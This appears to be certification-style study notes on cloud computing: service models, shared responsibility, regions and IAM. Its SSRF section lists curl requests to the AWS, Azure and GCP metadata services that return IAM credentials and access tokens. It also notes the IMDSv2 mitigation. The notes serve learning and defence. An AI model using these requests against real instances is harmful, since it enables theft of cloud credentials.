On-demand delivery of computing resources — servers, storage, databases, networking, software — over the internet from a provider's data centre. The consumer rents capacity rather than owning hardware. Dominant model for modern infrastructure.

Service Models

Model Provider manages Consumer manages Examples
IaaS Hardware, network, hypervisor OS, runtime, apps, data AWS EC2, Azure VMs, GCP Compute

The higher up the stack, the less the consumer manages — and the less attack surface they directly control.

Core Cloud Concepts

Shared Responsibility Model

Security responsibilities split between cloud provider and customer:

TEXT 
Provider responsible for:
— Physical security of data centres
— Hypervisor and host OS security
— Network infrastructure
— Service availability

Customer responsible for:
— Data classification and protection
— Identity and access management (IAM)
— OS and application patching (IaaS)
— Network configuration (security groups, firewalls)
— Encryption at rest and in transit

Misunderstanding this model is a common source of cloud misconfigurations — customers assume the provider secures more than they actually do.

Regions and Availability Zones

  • Region — a geographic area containing multiple data centres
  • Availability Zone (AZ) — one or more physically separate data centres within a region, with independent power, cooling, and networking
  • Edge locations — CDN endpoints closer to users than regions

Deploying across multiple AZs provides resilience; deploying across multiple regions provides disaster recovery and latency benefits.

IAM — Identity and Access Management

Controls who can do what to which resources. The most common source of cloud security incidents.

TEXT 
Core concepts (AWS terminology, broadly applicable):
— User: individual identity with credentials
— Role: assumed identity with temporary credentials (no password)
— Policy: JSON document defining allowed/denied actions
— Principle of least privilege: grant only what is needed

SSRF to Cloud Metadata

From a web application with SSRF, the instance metadata service is a critical target — it exposes IAM credentials:

SHELL 
# AWS IMDSv1 — no token required (legacy, being phased out)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Returns: AccessKeyId, SecretAccessKey, Token (temporary)
# These can be used with AWS CLI from the attacker's machine

# Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

See SSRF for full methodology.

Tips

  • The shared responsibility model boundary is a frequent exam and real-world confusion point — in IaaS the customer owns OS-level security; in SaaS they own only their data and config
  • IAM is where most cloud breaches originate — overly permissive roles, unused credentials, and missing MFA are the three most common issues
  • AWS CCP gives a solid foundation but cloud security depth comes from hands-on experience; CloudGoat and HackTheBox cloud tracks are good practical resources post-certification
  • IMDSv2 (token-required) mitigates the SSRF → metadata credential theft attack — check whether instances enforce it
